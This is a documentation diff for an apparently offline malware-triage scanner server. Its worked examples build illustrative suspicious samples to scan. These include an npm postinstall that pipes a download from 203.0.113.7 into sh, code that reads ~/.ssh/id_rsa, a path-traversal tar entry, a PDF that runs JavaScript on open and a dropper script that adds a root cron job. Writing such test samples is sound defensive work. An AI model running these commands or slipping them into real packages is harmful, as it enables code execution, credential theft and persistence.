@@ -203,8 +203,11 @@ Notes:
 
 - Use `-i` (keep stdin open) and no `-t`. The client speaks JSON-RPC over stdin and stdout.
 - Only mounted paths can be scanned. The image runs as user 65532, so mounted files must be readable by it.
-- Inside the container the cache goes to a per-user directory under the temp directory; with a read-only mount or file
-  system, pass `--no-cache` or `--cache-dir` to a writable path.
+- Inside the container the cache goes to the container user's cache directory, `$HOME/.cache/file-scanner`. If that
+  is not writable, the server says so on stderr and caches in memory only. Pass `--cache-dir` (for example a tmpfs or
+  a volume) to keep an on-disk cache, or `--no-cache` to turn caching off.
+- These Docker recipes were not run for this change: no image with these flags exists until the next release. Check
+  them against the image you use.
 - The image's entry point is the scanner itself, so always give the subcommand (`mcp-stdio` or `mcp-http`).
 - For HTTP in a container the server must listen on all container interfaces, and the published port should stay
   on the host's loopback unless you add a token:
@@ -310,7 +313,8 @@ the valid ones. Calling a tool that does not exist is a JSON-RPC `-32602` error.
 ### Paths
 
 Pass absolute paths. A leading `~/` is expanded. Symbolic links are resolved. FIFOs, sockets and device files are
-refused. With `--allow-root`, every path must resolve (symlinks and `..` included) to a place under one of the roots.
+refused as a path. Inside a directory, such an entry is skipped and listed as skipped; it is never opened. With
+`--allow-root`, every path must resolve (symlinks and `..` included) to a place under one of the roots.
 
 ### Testing by hand
 
@@ -336,7 +340,8 @@ only JSON-RPC to stdout; the banner goes to stderr.
 
 ## Tool reference
 
-Arguments marked `*` are required. Every tool also accepts `max_output_bytes` (default 80,000; values outside 4,000 to 400,000 are clamped, not rejected).
+Arguments marked `*` are required. Every tool also accepts `max_output_bytes` (default 80,000; values outside
+4,000 to 400,000 are clamped, not rejected).
 Paged tools accept `offset` (default 0) and `limit` (default 50, at most 500 unless stated). Unknown arguments are
 rejected. All tools are read-only except `cache_clear`. Examples are shortened and use `/samples/...` for paths.
 
@@ -352,7 +357,7 @@ Start here. Triage overview of a file or directory.
 | Boolean flags | The same section names as flags (`symbols: true`) are accepted too. |
 | `min_string_length` | Shortest string to count (default 4, at most 4,096). |
 | `hex_dump`, `hex_dump_size`, `hex_dump_offset` | Default 256 bytes, at most 4,096; negative offset: from end. |
-| `arch` | Slice of a universal Mach-O (`arm64`, `x86_64`, ...). |
+| `arch` | Universal Mach-O slice (`arm64`, `x86_64`, ...), for every per-slice section. Unknown: error. |
 | `recursive`, `max_files` | Directory only: descend; most files listed (default 1,000, ceiling 10,000). |
 | `offset`, `limit` | Directory only: page of the triage table (limit at most 200). |
 
@@ -414,7 +419,7 @@ Page and filter the lists inside one section of a file. Runs the section if it i
 | `encoding` | Strings only: `ascii`, `utf16le` or `utf16be`. |
 | `min_string_length` | Strings only (default 4, at most 4,096). |
 | `detail` | Return raw rows instead of compact ones. |
-| `arch` | Universal Mach-O slice. |
+| `arch` | Universal Mach-O slice, as for `analyze_file`. Unknown: error. |
 
 Lists by section: `strings`; `binary_info` (sections, imports, exports); `symbols` (functions, imports, exports,
 global_variables, cross_references); `control_flow` (functions); `vulnerabilities`; `code_quality` (functions,
@@ -439,15 +444,15 @@ page says so, and a `filter`, `category` or `encoding` scans the whole file agai
 
 ### disassemble
 
-Machine code of one function or address range of an ELF or thin Mach-O binary, as a text listing. Never the whole
-binary.
+Machine code of one function or address range, as a text listing. Never the whole binary.
+`disassemble` works on an ELF, a thin Mach-O, or one slice of a universal Mach-O.
 
 | Argument | Notes |
 | --- | --- |
 | `file_path`* | Absolute path. |
 | `function` | Function name (exact, else a unique case-insensitive match) or its address. |
 | `address` | `"0x401136"` or a number: the function containing it is listed from there. |
-| `arch` | Accepted, but ignored by this tool: a universal Mach-O is disassembled on one slice. |
+| `arch` | Universal Mach-O slice. Unknown: error. |
 | `max_instructions` | Default 200, at most 1,000. |
 | `filter`, `offset`, `limit` | With neither `function` nor `address`: page through the function list. |
 
@@ -476,9 +481,9 @@ With `function: "main", max_instructions: 5`:
 }
 ```
 
-Limits: a universal (fat) Mach-O is disassembled on one slice (the host's, arm64e on Apple silicon); `arch` does not
-select another slice for this tool. A bounded part of the disassembly is cached; an
-address outside it is decoded again for the call, which takes a moment on a large file.
+Limits: `disassemble` works on an ELF, a thin Mach-O, or one slice of a universal Mach-O. Pick the slice with
+`arch`. A bounded part of the disassembly is cached; an address outside it is decoded again for the call, which
+takes a moment on a large file.
 
 ### read_hex
 
@@ -615,8 +620,8 @@ Scan a file or directory with YARA rules (YARA-X).
 | Argument | Notes |
 | --- | --- |
 | `path`* | Absolute path of a file or directory. |
-| `yara_rule` | Rule text, or the word `builtin` for the scanner's own 10 rules (max 5 MB of text). |
-| `rule_path` | A `.yar`/`.yara` file, or a directory of them (max 20 MiB). `include` is not supported. |
+| `yara_rule` | Rule text, or the word `builtin` for the scanner's own rule set (max 5 MiB of text). |
+| `rule_path` | A `.yar`/`.yara` file or a directory of them: 20 MiB in all, 5 MiB a file, 1,000 files. No `include`. |
 | `recursive` | Default true. |
 | `max_file_size` | Bytes; default and ceiling 100 MB. Larger files are listed under `skipped`. |
 | `detailed_matches` | List matched strings (default true). |
@@ -734,9 +739,9 @@ List the entries of an archive without extracting it: `.zip` (and `.jar`, `.apk`
 
 ```json
 {
-  "sha256": "af7c99fe...", "cache": "miss",
+  "sha256": "f8f7c8ec...", "cache": "miss",
   "summary": { "format": "gzip-compressed tar archive (.tar.gz)", "entries": 3, "listed_entries": 3,
-               "uncompressed_bytes": 58, "encrypted": false, "risk": "critical", "risk_score": 100,
+               "uncompressed_bytes": 60, "encrypted": false, "risk": "critical", "risk_score": 100,
                "possible_bomb": false, "unsafe_paths": 1, "nested_archives": 0, "notes": [],
                "unsafe_path_examples": [ { "entry_path": "../../etc/cron.d/job", ... } ] },
   "entries": { "items": [
@@ -824,7 +829,9 @@ Vet a local npm package. The tool is offline: it never downloads anything.
 ```
 
 A registry name such as `express` or `lodash@4.17.4` is an error: run `npm pack express` and pass the `.tgz`.
-Limits: up to 400 source files (`.js .mjs .cjs .ts .sh`), 1 MiB each and 16 MiB in all, are scanned; a package that
+
+Limits: up to 400 source files, 1 MiB each and 16 MiB in all, are scanned (`.js .jsx .mjs .cjs .ts .tsx .mts .cts`,
+`.py .pyw .pth` and `.sh .bash .zsh .cmd .bat .ps1`; the Python tool reads the same extensions); a package that
 was not read in full is never rated safe. The advisory data is a small offline table (6 packages, newest advisory
 2022). An empty vulnerability list does not mean the package is clean.
 
@@ -840,8 +847,8 @@ The same tool for Python, with the same arguments and answer shape.
 A `poetry.lock` file is accepted as a dependency list.
 `setup.py` is checked for install-time behaviour. A PyPI name such as `requests==2.5.0` is an error: run
 `pip download` and pass the file. Version matching follows PEP 440 with normalized names; an unpinned requirement is
-unknown, not vulnerable. Limits: up to 400 source files (`.py .pth .sh`), 1 MiB each and 16 MiB in all. The advisory
-data is a small offline table (7 packages, newest advisory 2023).
+unknown, not vulnerable. Limits: up to 400 source files, 1 MiB each and 16 MiB in all (the same extensions as for the
+npm tool). The advisory data is a small offline table (7 packages, newest advisory 2023).
 
 ### cache_status
 
@@ -849,8 +856,8 @@ What the caches hold, and where.
 
 | Argument | Notes |
 | --- | --- |
-| `action` | `stats` (default), `list` (past `analyze_file` and `yara_scan_file` calls, newest first), `search` (like `list`, needs a filter). |
-| `tool_name`, `file_path_pattern` | Filters for `list` and `search`. |
+| `action` | `stats` (default); `list` (past `analyze_file` and `yara_scan_file` calls, newest first); `search`. |
+| `tool_name`, `file_path_pattern` | Filters for `list` and `search`; `search` needs one. |
 
 ```json
 {
@@ -871,47 +878,53 @@ for confirmation.
 | --- | --- |
 | `scope` | `all` (default), `analysis` (call history and cached sections, including files on disk) or `strings`. |
 
-It deletes only files the cache wrote. The answer lists what was cleared: `{"cleared": ["tracked strings"]}` for scope `strings`; the default scope returns `["analysis history, cached sections and files on disk", "tracked strings"]`. Later calls recompute.
+It deletes only files the cache wrote. The answer lists what was cleared: `{"cleared": ["tracked strings"]}` for scope
+`strings`; the default scope returns
+`["analysis history, cached sections and files on disk", "tracked strings"]`. Later calls recompute.
 
 ## Worked examples
 
-These are real sessions against the sample files shipped or built for this guide. Results are shortened.
+These are real tool calls with shortened results. `/samples` stands for the root of a checkout of this repository;
+the binaries are the ones under `test_programs/` (prebuilt, no compiler needed). The package, archive, PDF and script
+inputs are small illustrative files, not part of the repository and not real malware. Each section shows the commands
+that make them, so you can repeat the calls. Your sizes, offsets and hashes will differ from the ones shown.
 
 ### Triage an unknown binary
 
 An unknown ELF arrives. Start with the overview:
 
 ```json
-{ "name": "analyze_file", "arguments": { "file_path": "/samples/c_advanced_binary" } }
+{ "name": "analyze_file", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary" } }
 ```
 
 The overview shows an x86-64 ELF, not packed, with `127.0.0.1`, `/proc/self/status` and `ptrace` among its strings.
 That combination suggests anti-debugging. Ask for the threat sections:
 
 ```json
-{ "name": "analyze_file", "arguments": { "file_path": "/samples/c_advanced_binary",
+{ "name": "analyze_file", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary",
                                          "sections": ["threats", "behavioral"] } }
 ```
 
-The summaries report a Suspicious threat level and two built-in rule matches, `anti_analysis` and
-`network_communication`. Read the strings behind them:
+The summaries report a Malicious threat level and four built-in rule matches, among them `anti_analysis`,
+`network_communication` and `update_lookalike_domain`. Read the strings behind them:
 
 ```json
-{ "name": "query_analysis", "arguments": { "file_path": "/samples/c_advanced_binary", "section": "strings",
+{ "name": "query_analysis", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary", "section": "strings",
                                            "filter": "ptrace" } }
 ```
 
 Then read the code that uses `ptrace`. Get the function list, pick a name, list its instructions:
 
 ```json
-{ "name": "disassemble", "arguments": { "file_path": "/samples/c_advanced_binary", "function": "main",
+{ "name": "disassemble", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary", "function": "main",
                                         "max_instructions": 40 } }
 ```
 
 When you want bytes around a string offset (12682 for `Debugger detected!`), use `read_hex`:
 
 ```json
-{ "name": "read_hex", "arguments": { "file_path": "/samples/c_advanced_binary", "offset": 12640, "length": 96 } }
+{ "name": "read_hex", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary",
+                                     "offset": 12640, "length": 96 } }
 ```
 
 Every answer after the first said `cache: "hit"` or came from the cached sections, so the follow-ups were quick.
@@ -919,17 +932,39 @@ Every answer after the first said `cache: "hit"` or came from the cached section
 
 ### Vet an npm package
 
-You have a tarball (`npm pack left-pad-utils` writes it). The tool is offline, so give it the file:
+Make a small suspicious package and pack it. This stands in for a tarball from `npm pack`; the tool is offline, so
+give it the file:
+
+```bash
+mkdir -p /tmp/demo/package && cd /tmp/demo
+cat > package/package.json <<'EOF'
+{
+  "name": "left-pad-utils",
+  "version": "1.0.3",
+  "scripts": { "postinstall": "curl -s http://203.0.113.7/p.sh | sh" },
+  "dependencies": { "lodash": "4.17.4" }
+}
+EOF
+cat > package/index.js <<'EOF'
+const fs = require('fs');
+const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
+eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());
+module.exports = (s, n) => String(s).padStart(n);
+EOF
+tar czf left-pad-utils-1.0.3.tgz package
+```
+
+Then call the tool:
 
 ```json
-{ "name": "analyze_npm_package", "arguments": { "package_path": "/samples/left-pad-utils-1.0.3.tgz" } }
+{ "name": "analyze_npm_package", "arguments": { "package_path": "/tmp/demo/left-pad-utils-1.0.3.tgz" } }
 ```
 
 The summary rates the package Critical: a `postinstall` script pipes a download into a shell, `index.js` evaluates a
 decoded payload and reads `~/.ssh/id_rsa`, and the pinned `lodash` 4.17.4 has an advisory. Page the evidence:
 
 ```json
-{ "name": "analyze_npm_package", "arguments": { "package_path": "/samples/left-pad-utils-1.0.3.tgz",
+{ "name": "analyze_npm_package", "arguments": { "package_path": "/tmp/demo/left-pad-utils-1.0.3.tgz",
                                                 "section": "findings", "min_severity": "High" } }
 ```
 
@@ -942,8 +977,10 @@ unpack it and call `analyze_script` or `analyze_file` on that file.
 Index a few samples, then search all of them at once:
 
 ```json
-{ "name": "search_strings", "arguments": { "file_path": "/samples/c_advanced_binary", "query": "msftupdater" } }
-{ "name": "search_strings", "arguments": { "file_path": "/samples/rust_test_binary", "query": "msftupdater" } }
+{ "name": "search_strings", "arguments": { "file_path": "/samples/test_programs/c_advanced_binary",
+                                           "query": "msftupdater" } }
+{ "name": "search_strings", "arguments": { "file_path": "/samples/test_programs/rust_test_binary",
+                                           "query": "msftupdater" } }
 { "name": "search_strings", "arguments": { "query": "msftupdater" } }
 ```
 
@@ -971,27 +1008,60 @@ does not compile, the error gives the line and column; fix it and call again.
 
 ### Look inside an archive, a document or a script
 
-An archive that came with an email:
+An archive that came with an email. This one is built to hold a path that escapes the extraction directory and a
+double extension:
+
+```bash
+cd /tmp/demo
+python3 -I -c "
+import tarfile, io
+with tarfile.open('report.tar.gz', 'w:gz') as t:
+    for name, data in [('report.txt', b'numbers'), ('../../etc/cron.d/job', b'* * * * * root /tmp/x'),
+                       ('invoice.pdf.exe', b'MZ' + bytes(30))]:
+        info = tarfile.TarInfo(name)
+        info.size = len(data)
+        t.addfile(info, io.BytesIO(data))
+"
+```
+
+Then:
 
 ```json
-{ "name": "inspect_archive", "arguments": { "file_path": "/samples/report.tar.gz", "risky_only": true } }
+{ "name": "inspect_archive", "arguments": { "file_path": "/tmp/demo/report.tar.gz", "risky_only": true } }
 ```
 
 It rates the archive critical and lists the two bad entries: `../../etc/cron.d/job` escapes the extraction directory,
 and `invoice.pdf.exe` has a double extension. Nothing was extracted.
 
-A PDF:
+A PDF with JavaScript that runs on open. This hand-written file is minimal, but enough for the scanner to parse:
+
+```bash
+printf '%%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n' > /tmp/demo/invoice.pdf
+printf '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n' >> /tmp/demo/invoice.pdf
+printf '3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n' >> /tmp/demo/invoice.pdf
+printf '4 0 obj\n<< /S /JavaScript /JS (app.alert\\(1\\);) >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%%%EOF\n' \
+  >> /tmp/demo/invoice.pdf
+```
+
+Then:
 
 ```json
-{ "name": "analyze_document", "arguments": { "file_path": "/samples/invoice.pdf", "category": "script" } }
+{ "name": "analyze_document", "arguments": { "file_path": "/tmp/demo/invoice.pdf", "category": "script" } }
 ```
 
 The summary shows JavaScript plus an `OpenAction` that runs when the file opens, with byte offsets to feed `read_hex`.
 
 A shell script:
 
+```bash
+printf '%s\n' '#!/bin/sh' 'echo "updating"' 'curl -s http://203.0.113.7/payload.sh | sh' \
+  'echo "* * * * * root /tmp/.x" >> /etc/crontab' > /tmp/demo/dropper.sh
+```
+
+Then:
+
 ```json
-{ "name": "analyze_script", "arguments": { "file_path": "/samples/dropper.sh" } }
+{ "name": "analyze_script", "arguments": { "file_path": "/tmp/demo/dropper.sh" } }
 ```
 
 It reports a download-and-run on line 3 and a cron entry on line 4. If you are not sure which tool fits, call
@@ -1027,11 +1097,12 @@ It reports a download-and-run on line 3 and a cron entry on line 4. If you are n
 | `FILE_SCANNER_ALLOWED_ROOTS` | `:`-separated allow-roots, used when no `--allow-root` is given. |
 | `FILE_SCANNER_AUTH_TOKEN` | The bearer token. Prefer it to `--auth-token`: command lines are visible to other users. |
 | `FILE_SCANNER_CACHE_DIR` | Cache directory, used when no `--cache-dir` is given. |
-| `FILE_SCANNER_CACHE_DISK_MB` | Sets the section cache's disk budget (default 1 GiB) to N MiB and the analysis history's (default 256 MiB) to N/4. |
+| `FILE_SCANNER_CACHE_DISK_MB` | Section cache disk budget in MiB (default 1,024); the history gets a quarter of it. |
 | `FILE_SCANNER_SECTION_CACHE_MB` | Memory budget of the section cache in MiB (default 256). |
 
-No other environment variable changes the server. There is no log-level setting; the server prints a startup banner
-and security-relevant events (refused requests, an unusable cache directory) to stderr.
+These are the only `FILE_SCANNER_*` variables. The default cache location also depends on `HOME`, `XDG_CACHE_HOME`
+and the temp directory (see [The cache](#the-cache)). There is no log-level setting; the server prints a startup
+banner and security-relevant events (refused requests, an unusable cache directory) to stderr.
 
 ### Protocol revisions
 
@@ -1039,7 +1110,9 @@ The server negotiates every revision from 2024-11-05 through 2026-07-28 and repo
 instructions in the `initialize` result. In HTTP mode, clients older than 2026-07-28 use sessions (the
 `Mcp-Session-Id` header); 2026-07-28 requests are stateless and carry the protocol version in their request metadata.
 On stdio, a request sent before `initialize` needs that metadata too, except `ping`, which is always answered.
-The metadata goes in `params._meta` as `io.modelcontextprotocol/protocolVersion` and
+An `initialize` request that asks for 2026-07-28 is answered with `protocolVersion` 2025-11-25: 2026-07-28 is the
+stateless revision, reached through the per-request metadata without `initialize`. The metadata goes in
+`params._meta` as `io.modelcontextprotocol/protocolVersion` and
 `io.modelcontextprotocol/clientCapabilities`:
 
 ```json
@@ -1082,14 +1155,14 @@ protocol; they are for scripts and health checks.
 | `GET /cache/list`, `GET /cache/stats` | Analysis history entries and statistics. |
 | `POST /cache/search` | Body field `file_path_pattern` (not `file_path`), and `tool_name`. |
 | `POST /cache/clear` | Clear the caches. |
-| `/strings/stats` (GET); `/strings/search`, `/strings/details`, `/strings/related`, `/strings/filter` (POST) | String tracker. |
+| `GET /strings/stats`; `POST /strings/{search,details,related,filter}` | String tracker. |
 | `GET /api-docs/openapi.json` | OpenAPI description of the REST routes. |
 
 REST requests time out after 120 seconds (504), and at most 16 run at once. An example call:
 
 ```bash
 curl -s -X POST http://127.0.0.1:3000/tools/call -H 'Content-Type: application/json' \
-  -d '{"name":"read_hex","arguments":{"file_path":"/samples/c_advanced_binary","length":16}}'
+  -d '{"name":"read_hex","arguments":{"file_path":"/samples/test_programs/c_advanced_binary","length":16}}'
 ```
 
 When the server is stopped with Ctrl-C or SIGTERM it ends open streams and exits 0.
@@ -1102,8 +1175,9 @@ The server keeps two kinds of results, so drill-down calls do not repeat work.
   tools and similar) is stored by the file's SHA-256 and the options that change it. It holds compressed JSON text
   in memory (default 256 MiB) and on disk (default 1 GiB). When it is full, the least recently used entries go first.
   A repeated call on an unchanged file is a `hit`; editing the file changes its hash, so there is no stale result.
-- **Analysis history.** One record per `analyze_file` and `yara_scan_file` call (arguments, hash, time), used by `cache_status` and the REST
-  `/cache/*` routes. Results over 4 MiB are replaced by a size note. The total is bounded (256 MiB by default).
+- **Analysis history.** One record per `analyze_file` and `yara_scan_file` call (arguments, hash, time), used by
+  `cache_status` and the REST `/cache/*` routes. Results over 4 MiB are replaced by a size note. The total is bounded
+  (256 MiB by default).
 
 Where it lives:
 
@@ -1119,7 +1193,8 @@ If it cannot be used, the server prints one line on stderr and keeps the cache i
 share one directory.
 
 What is stored: the results the tools returned or computed, including extracted strings and hex samples from the
-files you analyzed, and the call history. The tracked-string index is kept in memory only and is rebuilt in each server process, so it is empty after a restart. The cached results on disk contain extracted strings and hex samples. It never stores a copy of the analyzed file. Treat the directory
+files you analyzed, and the call history. The tracked-string index is kept in memory only and is rebuilt in each
+server process, so it is empty after a restart. It never stores a copy of the analyzed file. Treat the directory
 as sensitive if the files were. Run `cache_clear` (or delete the directory) to remove it. `--no-cache` turns all of
 it off; drill-down calls then recompute their sections each time.
 
@@ -1133,14 +1208,14 @@ What this server does and does not do.
   payload.
 - **Formats.** Binary analysis covers ELF, PE and Mach-O (thin and universal). Code analysis (disassembly,
   control flow, call graph, vulnerabilities) is built for x86 (32 and 64 bit) and, in part, ARM64; for other
-  architectures expect an explicit error or a note. `disassemble` works on ELF and Mach-O; a universal Mach-O is read on one slice (the host's) and `arch` is ignored. PE
-  support in `disassemble` was not tested.
+  architectures expect an explicit error or a note. `disassemble` works on an ELF, a thin Mach-O, or one
+  slice of a universal Mach-O. PE support in `disassemble` was not tested.
   `analyze_document` reads PDF and Office (OLE2 and OOXML); `inspect_archive` lists zip, tar, tar.gz, RAR and 7z.
   Java: class files, JAR, WAR, EAR, AAR and APK manifests, but not DEX code. Scripts: shell, PowerShell,
   JavaScript, Python, batch and VBScript.
 - **Heuristics.** Threat levels, behavioral findings, vulnerability findings, taint flows, "likely packed" and
   "likely encrypted" are heuristics. They can be wrong in both directions. Vulnerability rules match calls by name;
-  a `Low` result is not a proof of safety. The built-in YARA rules are 10 general rules.
+  a `Low` result is not a proof of safety. The built-in YARA rules are general rules, not a family set.
 - **Offline vulnerability data.** The npm table has 6 packages and the Python table 7, with advisories up to 2022
   and 2023. Nothing is fetched. There is no CVE check for Java libraries or native binaries. Use `npm audit`,
   `pip-audit` or OSV for real coverage.
